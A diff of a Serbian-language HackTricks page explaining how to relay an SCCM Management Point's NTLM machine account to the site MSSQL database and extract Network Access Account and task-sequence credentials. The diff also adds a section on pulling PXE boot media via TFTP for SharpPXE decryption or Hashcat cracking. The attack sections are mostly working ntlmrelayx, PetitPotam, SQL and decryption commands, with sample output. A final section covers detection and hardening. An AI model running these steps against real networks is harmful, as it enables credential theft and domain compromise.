@@ -2,40 +2,40 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## TL;DR
-Prisiljavanjem **System Center Configuration Manager (SCCM) Management Point (MP)** da se autentifikuje preko SMB/RPC i **preusmeravanjem** tog NTLM korisničkog naloga na **bazu podataka sajta (MSSQL)** dobijate `smsdbrole_MP` / `smsdbrole_MPUserSvc` prava. Ove uloge vam omogućavaju da pozivate skup procedura koje izlažu **Operating System Deployment (OSD)** policy blobove (akreditivi za pristup mreži, varijable radnog toka, itd.). Blobovi su heksadecimalno kodirani/šifrovani, ali se mogu dekodirati i dešifrovati pomoću **PXEthief**, što daje tajne u običnom tekstu.
+## Sažetak
+Primoravanjem **System Center Configuration Manager (SCCM) Management Point (MP)** da se autentifikuje preko SMB/RPC i **relay-ovanjem** tog NTLM machine account-a na **site database (MSSQL)** dobijate prava `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Ove role vam omogućavaju pozivanje niza stored procedura koje izlažu **Operating System Deployment (OSD)** policy blob-ove (Network Access Account kredencijale, Task-Sequence varijable, itd.). Blob-ovi su hex-kodovani/enkriptovani, ali se mogu dekodirati i dekriptovati uz pomoć **PXEthief**, vraćajući plaintext tajne.
 
-Visok nivo lanca:
-1. Otkrijte MP & bazu podataka sajta ↦ neautentifikovani HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
-2. Pokrenite `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
-3. Prisilite MP koristeći **PetitPotam**, PrinterBug, DFSCoerce, itd.
-4. Kroz SOCKS proxy povežite se sa `mssqlclient.py -windows-auth` kao preusmereni **<DOMAIN>\\<MP-host>$** nalog.
-5. Izvršite:
+Pregled lanca:
+1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
+2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
+3. Coerce MP using **PetitPotam**, PrinterBug, DFSCoerce, etc.
+4. Through the SOCKS proxy connect with `mssqlclient.py -windows-auth` as the relayed **<DOMAIN>\\<MP-host>$** account.
+5. Execute:
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
-* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (ili `MP_GetPolicyBodyAfterAuthorization`)
-6. Uklonite `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.
+* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
+6. Strip `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.
 
-Tajne kao što su `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, itd. se obnavljaju bez dodirivanja PXE ili klijenata.
+Tajne poput `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, itd. se dobijaju bez diranja PXE-a ili klijenata.
 
 ---
 
-## 1. Enumerating unauthenticated MP endpoints
+## 1. Enumerisanje neautentifikovanih MP endpoint-a
 MP ISAPI ekstenzija **GetAuth.dll** izlaže nekoliko parametara koji ne zahtevaju autentifikaciju (osim ako je sajt samo PKI):
 
-| Parameter | Purpose |
+| Parametar | Svrha |
 |-----------|---------|
 | `MPKEYINFORMATIONMEDIA` | Vraća javni ključ sertifikata za potpisivanje sajta + GUID-ove *x86* / *x64* **All Unknown Computers** uređaja. |
-| `MPLIST` | Lista svaki Management Point na sajtu. |
-| `SITESIGNCERT` | Vraća sertifikat za potpisivanje Primarnog Sajta (identifikuje server sajta bez LDAP). |
+| `MPLIST` | Navodi svaki Management-Point u site-u. |
+| `SITESIGNCERT` | Vraća Primary-Site potpisni sertifikat (omogućava identifikovanje site servera bez LDAP-a). |
 
-Zgrabite GUID-ove koji će delovati kao **clientID** za kasnije DB upite:
+Uzmite GUID-ove koji će služiti kao **clientID** za kasnije DB upite:
 ```bash
 curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
 ```
 ---
 
-## 2. Prosledi MP račun mašine na MSSQL
+## 2. Relay MP mašinskog naloga na MSSQL
 ```bash
 # 1. Start the relay listener (SMB→TDS)
 ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
@@ -44,21 +44,21 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
 -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-Kada se primoravanje aktivira, trebali biste videti nešto poput:
+Kada se coercion pokrene, trebalo bi da vidite nešto ovako:
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
 ```
 ---
 
-## 3. Identifikujte OSD politike putem sačuvanih procedura
-Povežite se preko SOCKS proksija (port 1080 po defaultu):
+## 3. Identifikujte OSD politike putem stored procedures
+Povežite se preko SOCKS proxy (port 1080 po defaultu):
 ```bash
 proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
-Pređite na **CM_<SiteCode>** DB (koristite 3-cifreni kod lokacije, npr. `CM_001`).
+Pređite na bazu podataka **CM_<SiteCode>** (koristite trocifreni kod lokacije, npr. `CM_001`).
 
-### 3.1  Pronađite GUID-ove nepoznatih računara (opciono)
+### 3.1  Pronađite Unknown-Computer GUID-ove (opciono)
 ```sql
 USE CM_001;
 SELECT SMS_Unique_Identifier0
@@ -69,23 +69,23 @@ WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
-Svaki red sadrži `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.
+Svaki red sadrži `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.
 
 Fokusirajte se na politike:
-* **NAAConfig**  – kredencijali za nalog za pristup mreži
-* **TS_Sequence** – varijable sekvence zadatka (OSDJoinAccount/Password)
-* **CollectionSettings** – može sadržati naloge za izvršavanje
+* **NAAConfig**  – kredencijali Network Access Account-a
+* **TS_Sequence** – varijable Task Sequence-a (OSDJoinAccount/Password)
+* **CollectionSettings** – može sadržati run-as accounts
 
-### 3.3  Preuzmite puni sadržaj
-Ako već imate `PolicyID` i `PolicyVersion`, možete preskočiti zahtev za clientID koristeći:
+### 3.3  Preuzimanje pune vrednosti Body
+Ako već imate `PolicyID` & `PolicyVersion` možete preskočiti zahtev za clientID koristeći:
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> VAŽNO: U SSMS povećajte “Maksimalni broj preuzetih karaktera” (>65535) ili će blob biti skraćen.
+> VAŽNO: U SSMS-u povećajte “Maximum Characters Retrieved” (>65535) ili će blob biti skraćen.
 
 ---
 
-## 4. Dekodirajte i dekriptujte blob
+## 4. Dekodirajte i dešifrujte blob
 ```bash
 # Remove the UTF-16 BOM, convert from hex → XML
 echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
@@ -103,19 +103,19 @@ NetworkAccessPassword: P4ssw0rd123
 ---
 
 ## 5. Relevant SQL uloge i procedure
-Upon relay, prijava je mapirana na:
+Pri relay-u, login se mapira na:
 * `smsdbrole_MP`
 * `smsdbrole_MPUserSvc`
 
-Ove uloge izlažu desetine EXEC dozvola, ključne koje se koriste u ovom napadu su:
+Ove role otkrivaju desetine EXEC permisija, ključne koje se koriste u ovom napadu su:
 
-| Stored Procedure | Svrha |
+| Skladištena procedura | Svrha |
 |------------------|---------|
-| `MP_GetMachinePolicyAssignments` | Lista politika primenjenih na `clientID`. |
+| `MP_GetMachinePolicyAssignments` | Prikazuje politike primenjene na `clientID`. |
 | `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Vraća kompletno telo politike. |
-| `MP_GetListOfMPsInSiteOSD` | Vraćeno putem `MPKEYINFORMATIONMEDIA` puta. |
+| `MP_GetListOfMPsInSiteOSD` | Vraćeno putem `MPKEYINFORMATIONMEDIA` putanje. |
 
-Možete pregledati punu listu sa:
+Puni spisak možete pregledati pomoću:
 ```sql
 SELECT pr.name
 FROM   sys.database_principals AS dp
@@ -126,23 +126,34 @@ AND  pe.permission_name='EXECUTE';
 ```
 ---
 
-## 6. Detekcija i Ojačavanje
-1. **Pratite MP prijave** – bilo koji MP račun računara koji se prijavljuje sa IP adrese koja nije njegova domaćin ≈ relay.
-2. Omogućite **Proširenu zaštitu za autentifikaciju (EPA)** na bazi podataka sajta (`PREVENT-14`).
-3. Onemogućite neiskorišćeni NTLM, primenite SMB potpisivanje, ograničite RPC (
-iste mere zaštite korišćene protiv `PetitPotam`/`PrinterBug`).
-4. Ojačajte MP ↔ DB komunikaciju sa IPSec / mutual-TLS.
+## 6. PXE: prikupljanje boot medija (SharpPXE)
+* **PXE reply over UDP/4011**: pošaljite PXE boot zahtev Distribution Point-u podešenom za PXE. proxyDHCP odgovor otkriva putanje za boot kao što su `SMSBoot\\x64\\pxe\\variables.dat` (šifrovana konfiguracija) i `SMSBoot\\x64\\pxe\\boot.bcd`, plus opciono šifrovani blob ključa.
+* **Retrieve boot artifacts via TFTP**: koristite vraćene putanje da preuzmete `variables.dat` preko TFTP (neautentifikovano). Datoteka je mala (nekoliko KB) i sadrži šifrovane media promenljive.
+* **Decrypt or crack**:
+- Ako odgovor sadrži dekripcioni ključ, ubacite ga u **SharpPXE** da direktno dekriptujete `variables.dat`.
+- Ako ključ nije dostavljen (PXE media zaštićena prilagođenom lozinkom), SharpPXE generiše **Hashcat-compatible** `$sccm$aes128$...` hash za offline cracking. Nakon vraćanja lozinke, dekriptujte datoteku.
+* **Parse decrypted XML**: plaintext promenljive sadrže SCCM deployment metapodatke (**Management Point URL**, **Site Code**, GUID-ove medija i druge identifikatore). SharpPXE ih parsira i ispisuje spremnu **SharpSCCM** komandu sa GUID/PFX/site parametrima unapred popunjenim za dalju zloupotrebu.
+* **Requirements**: potrebna je samo mrežna dohvatljivost PXE listener-a (UDP/4011) i TFTP; lokalne administratorske privilegije nisu potrebne.
 
 ---
 
-## Takođe pogledajte
-* Osnovi NTLM relaya:
+## 7. Detekcija i hardening
+1. **Monitor MP logins** – svaki MP computer account koji se prijavi sa IP adrese koja nije njegov host ≈ relay.
+2. Omogućite **Extended Protection for Authentication (EPA)** na site bazi podataka (`PREVENT-14`).
+3. Onemogućite neiskorišćeni NTLM, obavezno omogućite SMB signing, ograničite RPC (iste mitigacije koje se koriste protiv `PetitPotam`/`PrinterBug`).
+4. Ojačajte MP ↔ DB komunikaciju koristeći IPSec / mutual-TLS.
+5. **Constrain PXE exposure** – ograničite UDP/4011 i TFTP na pouzdane VLAN-ove, zahtevajte PXE lozinke i podižite upozorenja pri TFTP preuzimanjima `SMSBoot\\*\\pxe\\variables.dat`.
+
+---
+
+## Vidi takođe
+* Osnove NTLM relay-a:
 
 {{#ref}}
 ../ntlm/README.md
 {{#endref}}
 
-* MSSQL zloupotreba i post-ekspolatacija:
+* Zloupotreba MSSQL i post-eksploatacija:
 
 {{#ref}}
 abusing-ad-mssql.md
@@ -151,7 +162,8 @@ abusing-ad-mssql.md
 
 
 ## Reference
-- [Želeo bih da razgovaram sa vašim menadžerom: Krađa tajni pomoću relaya tačaka upravljanja](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
 - [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
-- [Menadžer pogrešnih konfiguracija – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
+- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
+- [SharpPXE](https://github.com/leftp/SharpPXE)
 {{#include ../../banners/hacktricks-training.md}}
